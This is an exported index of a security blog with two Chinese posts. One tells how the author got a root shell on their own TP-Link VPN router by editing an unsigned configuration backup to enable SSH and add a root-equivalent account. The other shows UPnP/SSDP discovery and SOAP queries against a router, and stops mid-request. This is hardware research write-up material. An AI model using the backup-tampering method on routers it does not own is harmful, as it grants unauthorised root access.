{"meta":{"title":"p1yang","subtitle":"","description":"","author":"p1yang","url":"http://example.com"},"pages":[],"posts":[{"title":"tplink企业vpn路由器GetShell","slug":"iot/tplink-getshell","date":"2023-11-13T05:40:07.201Z","updated":"2023-12-21T06:36:15.508Z","comments":true,"path":"article/de04eab8.html","link":"","permalink":"http://example.com/article/de04eab8.html","excerpt":"","text":"闲鱼上淘到某款企业vpn路由器，比较早的设备。 拿到某款设备肯定要想办法拿到固件来分析，并搞到getshell来干更多好玩的东西。 前期尝试通过官方网站下载的升级固件，尝试升级。 寄！ 尝试扫描端口查看是否开启ssh。 寄！ 都无效，也没有查到历史漏洞，只能拆了。 串口通过调试，并不能获取到任何数据，可能是给关掉了。 基本思路均失败。 发现配置文件，尝试新思路在系统工具，设备管理中发现备份设置，该品牌设备多是基于openwrt开发，所以我们将希望寄托在备份文件中。 尝试下载备份文件。 分析发现为gzip压缩文件，直接解包。 发现了dropbear，passwd，shadow等文件，思路这不就来了。 首先尝试修改dropbear配置文件，将其改为开机自启。添加自定义用户，权限组为root，并设置其密码为自定义，方便dropbear打开后能正常登陆shell。 通过关键字搜索，发现dropbear配置文件 将ssh_port_switch修改为on，使设备启动时打开ssh 并记住其端口，33400 先将其打包恢复备份，查看是否有签名校验。 成功恢复，证明没有签名校验，然后尝试ssh连接设备 成功开启ssh，下一步就是创建自定义用户，是我们能够成功登入系统 修改passwd和shadow文件 修改passwd文件，这里我创建了一个与root一样的用户pipi 在shadow中给pipi用户设置密码，这里自定义即可，也可以直接复制自己linux机器的用户名密码 在次打包，将其恢复。 成功登入，可以发现其就是一个openwrt。 cat &#x2F;proc&#x2F;cpuinfo后可以发现其设备为mips架构，使用的是高通骁龙QCA956X的一款芯片。 openwrt可玩性很高，这里不多赘述。 提取固件getShell之后可以尝试使用dd命令来提取固件，大概思路如下。 使用cat &#x2F;proc&#x2F;mtd来查看分区 使用dd命令来直接提取分区 得益于openwrt的各种命令都比较完整，可以用nc 等方式将固件下载到本地来进行分析。 以上就是通过修改备份文件的思路来GetShell。","categories":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}],"tags":[],"keywords":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}]},{"title":"协议-upnp","slug":"iot/协议-upnp","date":"2023-08-29T09:40:36.134Z","updated":"2023-08-30T01:00:14.149Z","comments":true,"path":"article/697ff101.html","link":"","permalink":"http://example.com/article/697ff101.html","excerpt":"","text":"upnp访问过程 #随笔 udp访问239.255.255.250的1900端口，ssdp协议 import socket import re ANY = &quot;0.0.0.0&quot; DES_IP = &quot;239.255.255.250&quot; PORT = 1900 xml_str = b&#x27;M-SEARCH * HTTP/1.1\\r\\n&#x27; \\ \\+ b&#x27;HOST: 239.255.255.250:1900\\r\\n&#x27; \\ \\+ b&#x27;MAN: &quot;ssdp:discover&quot;\\r\\n&#x27; \\ \\+ b&#x27;MX: 1\\r\\n&#x27; \\ \\+ b&#x27;ST: urn:dial-multiscreen-org:service:dial:1\\r\\n&#x27; \\ \\+ b&#x27;USER-AGENT: Google Chrome/87.0.4280.88 Windows\\r\\n\\r\\n\\r\\n&#x27; s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM,socket.IPPROTO_UDP) s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1) s.bind((ANY,PORT)) s.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255) s.setsockopt( socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, socket.inet_aton(DES_IP) + socket.inet_aton(ANY) ) s.setblocking(False) s.sendto(xml_str,(DES_IP,PORT)) while True: try: data, address = s.recvfrom(2048) except Exception as e: pass else: print(address) print(data) 通过这种方式可以获取到同网下的其他upnp设备信息 (&#x27;10.0.0.1&#x27;, 35150) b&#x27;NOTIFY * HTTP/1.1\\r\\nHOST: 239.255.255.250:1900\\r\\nCACHE-CONTROL: max-age=3600\\r\\nLOCATION: http://10.0.0.1:56688/rootDesc.xml\\r\\nSERVER: OpenWRT/OpenWrt UPnP/1.1 MiniUPnPd/2.0\\r\\nNT: upnp:rootdevice\\r\\nUSN: uuid:97fd7581-d522-415d-bfae-a51ac69e4b55::upnp:rootdevice\\r\\nNTS: ssdp:alive\\r\\nOPT: &quot;http://schemas.upnp.org/upnp/1/0/&quot;; ns=01\\r\\n01-NLS: 1693189369\\r\\nBOOTID.UPNP.ORG: 1693189369\\r\\nCONFIGID.UPNP.ORG: 1337\\r\\n\\r\\n&#x27; (&#x27;10.0.0.1&#x27;, 60956) b&#x27;NOTIFY * HTTP/1.1\\r\\nHOST: 239.255.255.250:1900\\r\\nCACHE-CONTROL: max-age=1801\\r\\nNTS: ssdp:alive\\r\\nLOCATION: http://10.0.0.1:49153/wps_device.xml\\r\\nSERVER: Unspecified, UPnP/1.0, Unspecified\\r\\nNT: urn:schemas-wifialliance-org:service:WFAWLANConfig:1\\r\\nUSN: uuid:dd20a05f-a846-47cf-b976-047083022a1d::urn:schemas-wifialliance-org:service:WFAWLANConfig:1\\r\\n\\r\\n&#x27; 现在是以10.0.0.1做演示 信息中能发现LOCATION http://10.0.0.1:49153/wps_device.xml http://10.0.0.1:56688/rootDesc.xml rootDesc.xml文件 This XML file does not appear to have any style information associated with it. The document tree is shown below. &lt;root xmlns=&quot;urn:schemas-upnp-org:device-1-0&quot; configId=&quot;1337&quot;&gt; &lt;specVersion&gt; ​ &lt;major&gt;1&lt;/major&gt; ​ &lt;minor&gt;1&lt;/minor&gt; &lt;/specVersion&gt; &lt;device&gt; ​ &lt;deviceType&gt;urn:schemas-upnp-org:device:InternetGatewayDevice:1&lt;/deviceType&gt; ​ &lt;friendlyName&gt;RAX40 (Gateway)&lt;/friendlyName&gt; ​ &lt;manufacturer&gt;Netgear, Inc.&lt;/manufacturer&gt; ​ &lt;manufacturerURL&gt;http://www.NETGEAR.com&lt;/manufacturerURL&gt; ​ &lt;modelDescription&gt;OpenWRT router&lt;/modelDescription&gt; ​ &lt;modelName&gt;RAX40&lt;/modelName&gt; ​ &lt;modelNumber&gt;RAX40&lt;/modelNumber&gt; ​ &lt;modelURL&gt;http://www.netgear.com/home&lt;/modelURL&gt; ​ &lt;serialNumber&gt;5UP299WPA0C55&lt;/serialNumber&gt; ​ &lt;UDN&gt;uuid:97fd7581-d522-415d-bfae-a51ac69e4b55&lt;/UDN&gt; ​ &lt;serviceList&gt; ​ &lt;service&gt; ​ &lt;serviceType&gt;urn:schemas-upnp-org:service:Layer3Forwarding:1&lt;/serviceType&gt; ​ &lt;serviceId&gt;urn:upnp-org:serviceId:L3Forwarding1&lt;/serviceId&gt; ​ &lt;SCPDURL&gt;/L3F.xml&lt;/SCPDURL&gt; ​ &lt;controlURL&gt;/ctl/L3F&lt;/controlURL&gt; ​ &lt;eventSubURL&gt;/evt/L3F&lt;/eventSubURL&gt; ​ &lt;/service&gt; ​ &lt;/serviceList&gt; ​ &lt;deviceList&gt; ​ &lt;device&gt; ​ &lt;deviceType&gt;urn:schemas-upnp-org:device:WANDevice:1&lt;/deviceType&gt; ​ &lt;friendlyName&gt;WANDevice&lt;/friendlyName&gt; ​ &lt;manufacturer&gt;MiniUPnP&lt;/manufacturer&gt; ​ &lt;manufacturerURL&gt;http://miniupnp.free.fr/&lt;/manufacturerURL&gt; ​ &lt;modelDescription&gt;WAN Device&lt;/modelDescription&gt; ​ &lt;modelName&gt;WAN Device&lt;/modelName&gt; ​ &lt;modelNumber&gt;20220318&lt;/modelNumber&gt; ​ &lt;modelURL&gt;http://miniupnp.free.fr/&lt;/modelURL&gt; ​ &lt;serialNumber&gt;5UP299WPA0C55&lt;/serialNumber&gt; ​ &lt;UDN&gt;uuid:97fd7581-d522-415d-bfae-a51ac69e4b56&lt;/UDN&gt; ​ &lt;UPC&gt;000000000000&lt;/UPC&gt; ​ &lt;serviceList&gt; ​ &lt;service&gt; ​ &lt;serviceType&gt;urn:schemas-upnp-org:service:WANCommonInterfaceConfig:1&lt;/serviceType&gt; ​ &lt;serviceId&gt;urn:upnp-org:serviceId:WANCommonIFC1&lt;/serviceId&gt; ​ &lt;SCPDURL&gt;/WANCfg.xml&lt;/SCPDURL&gt; ​ &lt;controlURL&gt;/ctl/CmnIfCfg&lt;/controlURL&gt; ​ &lt;eventSubURL&gt;/evt/CmnIfCfg&lt;/eventSubURL&gt; ​ &lt;/service&gt; ​ &lt;/serviceList&gt; ​ &lt;deviceList&gt; ​ &lt;device&gt; ​ &lt;deviceType&gt;urn:schemas-upnp-org:device:WANConnectionDevice:1&lt;/deviceType&gt; ​ &lt;friendlyName&gt;WANConnectionDevice&lt;/friendlyName&gt; ​ &lt;manufacturer&gt;MiniUPnP&lt;/manufacturer&gt; ​ &lt;manufacturerURL&gt;http://miniupnp.free.fr/&lt;/manufacturerURL&gt; ​ &lt;modelDescription&gt;MiniUPnP daemon&lt;/modelDescription&gt; ​ &lt;modelName&gt;MiniUPnPd&lt;/modelName&gt; ​ &lt;modelNumber&gt;20220318&lt;/modelNumber&gt; ​ &lt;modelURL&gt;http://miniupnp.free.fr/&lt;/modelURL&gt; ​ &lt;serialNumber&gt;5UP299WPA0C55&lt;/serialNumber&gt; ​ &lt;UDN&gt;uuid:97fd7581-d522-415d-bfae-a51ac69e4b57&lt;/UDN&gt; ​ &lt;UPC&gt;000000000000&lt;/UPC&gt; ​ &lt;serviceList&gt; ​ &lt;service&gt; ​ &lt;serviceType&gt;urn:schemas-upnp-org:service:WANIPConnection:1&lt;/serviceType&gt; ​ &lt;serviceId&gt;urn:upnp-org:serviceId:WANIPConn1&lt;/serviceId&gt; ​ &lt;SCPDURL&gt;/WANIPCn.xml&lt;/SCPDURL&gt; ​ &lt;controlURL&gt;/ctl/IPConn&lt;/controlURL&gt; ​ &lt;eventSubURL&gt;/evt/IPConn&lt;/eventSubURL&gt; ​ &lt;/service&gt; ​ &lt;/serviceList&gt; ​ &lt;/device&gt; ​ &lt;/deviceList&gt; ​ &lt;/device&gt; ​ &lt;/deviceList&gt; ​ &lt;presentationURL&gt;http://www.routerlogin.net&lt;/presentationURL&gt; &lt;/device&gt; &lt;/root&gt; 其中可以获取设备名称制造商各种服务等信息 L3Forwarding1 &lt;service&gt; ​ &lt;serviceType&gt;urn:schemas-upnp-org:service:Layer3Forwarding:1&lt;/serviceType&gt; ​ &lt;serviceId&gt;urn:upnp-org:serviceId:L3Forwarding1&lt;/serviceId&gt; ​ &lt;SCPDURL&gt;/L3F.xml&lt;/SCPDURL&gt; ​ &lt;controlURL&gt;/ctl/L3F&lt;/controlURL&gt; ​ &lt;eventSubURL&gt;/evt/L3F&lt;/eventSubURL&gt; &lt;/service&gt; WANCommonIFC1 &lt;service&gt; ​ &lt;serviceType&gt;urn:schemas-upnp-org:service:WANCommonInterfaceConfig:1&lt;/serviceType&gt; ​ &lt;serviceId&gt;urn:upnp-org:serviceId:WANCommonIFC1&lt;/serviceId&gt; ​ &lt;SCPDURL&gt;/WANCfg.xml&lt;/SCPDURL&gt; ​ &lt;controlURL&gt;/ctl/CmnIfCfg&lt;/controlURL&gt; ​ &lt;eventSubURL&gt;/evt/CmnIfCfg&lt;/eventSubURL&gt; &lt;/service&gt; WANIPConn1 &lt;service&gt; ​ &lt;serviceType&gt;urn:schemas-upnp-org:service:WANIPConnection:1&lt;/serviceType&gt; ​ &lt;serviceId&gt;urn:upnp-org:serviceId:WANIPConn1&lt;/serviceId&gt; ​ &lt;SCPDURL&gt;/WANIPCn.xml&lt;/SCPDURL&gt; ​ &lt;controlURL&gt;/ctl/IPConn&lt;/controlURL&gt; ​ &lt;eventSubURL&gt;/evt/IPConn&lt;/eventSubURL&gt; &lt;/service&gt; 通过访问SCPDURL可以获取服务的具体行为，以WANIPConn1为例 访问http://10.0.0.1:56688/WANIPCn.xml This XML file does not appear to have any style information associated with it. The document tree is shown below. &lt;scpd xmlns=&quot;urn:schemas-upnp-org:service-1-0&quot;&gt; &lt;specVersion&gt; ​ &lt;major&gt;1&lt;/major&gt; ​ &lt;minor&gt;1&lt;/minor&gt; &lt;/specVersion&gt; &lt;actionList&gt; ​ &lt;action&gt; ​ &lt;name&gt;SetConnectionType&lt;/name&gt; ​ &lt;argumentList&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewConnectionType&lt;/name&gt; ​ &lt;direction&gt;in&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;ConnectionType&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;/argumentList&gt; ​ &lt;/action&gt; ​ &lt;action&gt; ​ &lt;name&gt;GetConnectionTypeInfo&lt;/name&gt; ​ &lt;argumentList&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewConnectionType&lt;/name&gt; ​ &lt;direction&gt;out&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;ConnectionType&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewPossibleConnectionTypes&lt;/name&gt; ​ &lt;direction&gt;out&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;PossibleConnectionTypes&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;/argumentList&gt; ​ &lt;/action&gt; ​ &lt;action&gt; ​ &lt;name&gt;RequestConnection&lt;/name&gt; ​ &lt;/action&gt; ​ &lt;action&gt; ​ &lt;name&gt;ForceTermination&lt;/name&gt; ​ &lt;/action&gt; ​ &lt;action&gt; ​ &lt;name&gt;GetStatusInfo&lt;/name&gt; ​ &lt;argumentList&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewConnectionStatus&lt;/name&gt; ​ &lt;direction&gt;out&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;ConnectionStatus&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewLastConnectionError&lt;/name&gt; ​ &lt;direction&gt;out&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;LastConnectionError&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewUptime&lt;/name&gt; ​ &lt;direction&gt;out&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;Uptime&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;/argumentList&gt; ​ &lt;/action&gt; ​ &lt;action&gt; ​ &lt;name&gt;GetNATRSIPStatus&lt;/name&gt; ​ &lt;argumentList&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewRSIPAvailable&lt;/name&gt; ​ &lt;direction&gt;out&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;RSIPAvailable&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewNATEnabled&lt;/name&gt; ​ &lt;direction&gt;out&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;NATEnabled&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;/argumentList&gt; ​ &lt;/action&gt; ​ &lt;action&gt; ​ &lt;name&gt;GetGenericPortMappingEntry&lt;/name&gt; ​ &lt;argumentList&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewPortMappingIndex&lt;/name&gt; ​ &lt;direction&gt;in&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;PortMappingNumberOfEntries&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewRemoteHost&lt;/name&gt; ​ &lt;direction&gt;out&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;RemoteHost&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewExternalPort&lt;/name&gt; ​ &lt;direction&gt;out&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;ExternalPort&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewProtocol&lt;/name&gt; ​ &lt;direction&gt;out&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;PortMappingProtocol&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewInternalPort&lt;/name&gt; ​ &lt;direction&gt;out&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;InternalPort&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewInternalClient&lt;/name&gt; ​ &lt;direction&gt;out&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;InternalClient&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewEnabled&lt;/name&gt; ​ &lt;direction&gt;out&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;PortMappingEnabled&lt;/relatedStateVariable&gt; ​ &lt;/argument ​ &lt;argument&gt; ​ &lt;name&gt;NewPortMappingDescription&lt;/name&gt; ​ &lt;direction&gt;out&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;PortMappingDescription&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewLeaseDuration&lt;/name&gt; ​ &lt;direction&gt;out&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;PortMappingLeaseDuration&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;/argumentList&gt; ​ &lt;/action&gt; ​ &lt;action&gt; ​ &lt;name&gt;GetSpecificPortMappingEntry&lt;/name&gt; ​ &lt;argumentList&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewRemoteHost&lt;/name&gt; ​ &lt;direction&gt;in&lt;/direction ​ &lt;relatedStateVariable&gt;RemoteHost&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewExternalPort&lt;/name&gt; ​ &lt;direction&gt;in&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;ExternalPort&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewProtocol&lt;/name&gt; ​ &lt;direction&gt;in&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;PortMappingProtocol&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewInternalPort&lt;/name&gt; ​ &lt;direction&gt;out&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;InternalPort&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewInternalClient&lt;/name&gt; ​ &lt;direction&gt;out&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;InternalClient&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewEnabled&lt;/name&gt; ​ &lt;direction&gt;out&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;PortMappingEnabled&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewPortMappingDescription&lt;/name&gt; ​ &lt;direction&gt;out&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;PortMappingDescription&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewLeaseDuration&lt;/name&gt; ​ &lt;direction&gt;out&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;PortMappingLeaseDuration&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;/argumentList&gt; ​ &lt;/action&gt; ​ &lt;action&gt; ​ &lt;name&gt;AddPortMapping&lt;/name&gt; ​ &lt;argumentList&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewRemoteHost&lt;/name&gt; ​ &lt;direction&gt;in&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;RemoteHost&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewExternalPort&lt;/name&gt; ​ &lt;direction&gt;in&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;ExternalPort&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewProtocol&lt;/name&gt; ​ &lt;direction&gt;in&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;PortMappingProtocol&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewInternalPort&lt;/name&gt; ​ &lt;direction&gt;in&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;InternalPort&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewInternalClient&lt;/name&gt; ​ &lt;direction&gt;in&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;InternalClient&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewEnabled&lt;/name&gt; ​ &lt;direction&gt;in&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;PortMappingEnabled&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewPortMappingDescription&lt;/name&gt; ​ &lt;direction&gt;in&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;PortMappingDescription&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewLeaseDuration&lt;/name&gt; ​ &lt;direction&gt;in&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;PortMappingLeaseDuration&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;/argumentList&gt; ​ &lt;/action&gt; ​ &lt;action&gt; ​ &lt;name&gt;DeletePortMapping&lt;/name&gt; ​ &lt;argumentList&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewRemoteHost&lt;/name&gt; ​ &lt;direction&gt;in&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;RemoteHost&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewExternalPort&lt;/name&gt; ​ &lt;direction&gt;in&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;ExternalPort&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewProtocol&lt;/name&gt; ​ &lt;direction&gt;in&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;PortMappingProtocol&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;/argumentList&gt; ​ &lt;/action&gt; ​ &lt;action&gt; ​ &lt;name&gt;GetExternalIPAddress&lt;/name&gt; ​ &lt;argumentList&gt; ​ &lt;argument&gt; ​ &lt;name&gt;NewExternalIPAddress&lt;/name&gt; ​ &lt;direction&gt;out&lt;/direction&gt; ​ &lt;relatedStateVariable&gt;ExternalIPAddress&lt;/relatedStateVariable&gt; ​ &lt;/argument&gt; ​ &lt;/argumentList&gt; ​ &lt;/action&gt; &lt;/actionList&gt; &lt;serviceStateTable&gt; ​ &lt;stateVariable sendEvents=&quot;no&quot;&gt; ​ &lt;name&gt;ConnectionType&lt;/name&gt; ​ &lt;dataType&gt;string&lt;/dataType&gt; ​ &lt;defaultValue&gt;IP_Routed&lt;/defaultValue&gt; ​ &lt;/stateVariable&gt; ​ &lt;stateVariable sendEvents=&quot;yes&quot; ​ &lt;name&gt;PossibleConnectionTypes&lt;/name&gt; ​ &lt;dataType&gt;string&lt;/dataType&gt; ​ &lt;allowedValueList&gt; ​ &lt;allowedValue&gt;Unconfigured&lt;/allowedValue&gt; ​ &lt;allowedValue&gt;IP_Routed&lt;/allowedValue&gt; ​ &lt;allowedValue&gt;IP_Bridged&lt;/allowedValue&gt; ​ &lt;/allowedValueList&gt; ​ &lt;/stateVariable&gt; ​ &lt;stateVariable sendEvents=&quot;yes&quot;&gt; ​ &lt;name&gt;ConnectionStatus&lt;/name&gt; ​ &lt;dataType&gt;string&lt;/dataType&gt; ​ &lt;defaultValue&gt;Unconfigured&lt;/defaultValue&gt; ​ &lt;allowedValueList&gt; ​ &lt;allowedValue&gt;Unconfigured&lt;/allowedValue&gt; ​ &lt;allowedValue&gt;Connecting&lt;/allowedValue&gt; ​ &lt;allowedValue&gt;Connected&lt;/allowedValue&gt; ​ &lt;allowedValue&gt;PendingDisconnect&lt;/allowedValue&gt; ​ &lt;allowedValue&gt;Disconnecting&lt;/allowedValue&gt; ​ &lt;allowedValue&gt;Disconnected&lt;/allowedValue&gt; ​ &lt;/allowedValueList&gt; ​ &lt;/stateVariable&gt; ​ &lt;stateVariable sendEvents=&quot;no&quot;&gt; ​ &lt;name&gt;Uptime&lt;/name&gt; ​ &lt;dataType&gt;ui4&lt;/dataType&gt; ​ &lt;/stateVariable&gt; ​ &lt;stateVariable sendEvents=&quot;no&quot;&gt; ​ &lt;name&gt;LastConnectionError&lt;/name&gt; ​ &lt;dataType&gt;string&lt;/dataType&gt; ​ &lt;defaultValue&gt;ERROR_NONE&lt;/defaultValue&gt; ​ &lt;allowedValueList&gt; ​ &lt;allowedValue&gt;ERROR_NONE&lt;/allowedValue&gt; ​ &lt;/allowedValueList&gt; ​ &lt;/stateVariable&gt; ​ &lt;stateVariable sendEvents=&quot;no&quot;&gt; ​ &lt;name&gt;RSIPAvailable&lt;/name&gt; ​ &lt;dataType&gt;boolean&lt;/dataType&gt; ​ &lt;defaultValue&gt;0&lt;/defaultValue&gt; ​ &lt;/stateVariable&gt; ​ &lt;stateVariable sendEvents=&quot;no&quot;&gt; ​ &lt;name&gt;NATEnabled&lt;/name&gt; ​ &lt;dataType&gt;boolean&lt;/dataType&gt; ​ &lt;defaultValue&gt;1&lt;/defaultValue&gt; ​ &lt;/stateVariable&gt; ​ &lt;stateVariable sendEvents=&quot;yes&quot;&gt; ​ &lt;name&gt;ExternalIPAddress&lt;/name&gt; ​ &lt;dataType&gt;string&lt;/dataType&gt; ​ &lt;/stateVariable&gt; ​ &lt;stateVariable sendEvents=&quot;yes&quot;&gt; ​ &lt;name&gt;PortMappingNumberOfEntries&lt;/name&gt; ​ &lt;dataType&gt;ui2&lt;/dataType&gt; ​ &lt;/stateVariable&gt; ​ &lt;stateVariable sendEvents=&quot;no&quot;&gt; ​ &lt;name&gt;PortMappingEnabled&lt;/name&gt; ​ &lt;dataType&gt;boolean&lt;/dataType&gt; ​ &lt;/stateVariable&gt; ​ &lt;stateVariable sendEvents=&quot;no&quot;&gt; ​ &lt;name&gt;PortMappingLeaseDuration&lt;/name&gt; ​ &lt;dataType&gt;ui4&lt;/dataType&gt; ​ &lt;defaultValue&gt;3600&lt;/defaultValue&gt; ​ &lt;allowedValueRange&gt; ​ &lt;minimum&gt;0&lt;/minimum&gt; ​ &lt;maximum&gt;604800&lt;/maximum&gt; ​ &lt;/allowedValueRange&gt; ​ &lt;/stateVariable&gt; ​ &lt;stateVariable sendEvents=&quot;no&quot;&gt; ​ &lt;name&gt;RemoteHost&lt;/name&gt; ​ &lt;dataType&gt;string&lt;/dataType&gt; ​ &lt;/stateVariable&gt; ​ &lt;stateVariable sendEvents=&quot;no&quot;&gt; ​ &lt;name&gt;ExternalPort&lt;/name&gt; ​ &lt;dataType&gt;ui2&lt;/dataType&gt; ​ &lt;/stateVariable&gt; ​ &lt;stateVariable sendEvents=&quot;no&quot;&gt; ​ &lt;name&gt;InternalPort&lt;/name&gt; ​ &lt;dataType&gt;ui2&lt;/dataType&gt; ​ &lt;allowedValueRange&gt; ​ &lt;minimum&gt;1&lt;/minimum&gt; ​ &lt;maximum&gt;65535&lt;/maximum&gt; ​ &lt;/allowedValueRange&gt; ​ &lt;/stateVariable&gt; ​ &lt;stateVariable sendEvents=&quot;no&quot;&gt; ​ &lt;name&gt;PortMappingProtocol&lt;/name&gt; ​ &lt;dataType&gt;string&lt;/dataType&gt; ​ &lt;allowedValueList&gt; ​ &lt;allowedValue&gt;TCP&lt;/allowedValue&gt; ​ &lt;allowedValue&gt;UDP&lt;/allowedValue&gt; ​ &lt;/allowedValueList&gt; ​ &lt;/stateVariable&gt; ​ &lt;stateVariable sendEvents=&quot;no&quot;&gt; ​ &lt;name&gt;InternalClient&lt;/name&gt; ​ &lt;dataType&gt;string&lt;/dataType&gt; ​ &lt;/stateVariable&gt; ​ &lt;stateVariable sendEvents=&quot;no&quot;&gt; ​ &lt;name&gt;PortMappingDescription&lt;/name&gt; ​ &lt;dataType&gt;string&lt;/dataType&gt; ​ &lt;/stateVariable&gt; &lt;/serviceStateTable&gt; &lt;/scpd&gt; 分类统计有以下几种： SetConnectionType,GetConnectionTypeInfo,RequestConnection,ForceTermination,GetStatusInfo,GetNATRSIPStatus,GetGenericPortMappingEntry,GetSpecificPortMappingEntry,AddPortMapping,DeletePortMapping,GetExternalIPAddress 通过构造POST请求，访问controlURL：http://10.0.0.1:56688/ctl/IPConn POST /ctl/IPConn HTTP/1.1 Host: 10.0.0.1:56688 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.62 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6 SOAPAction: &quot;urn:schemas-upnp-org:service:WANIPConnection:1#GetExternalIPAddress&quot; Connection: close Content-Length: 260 &lt;s:Envelope 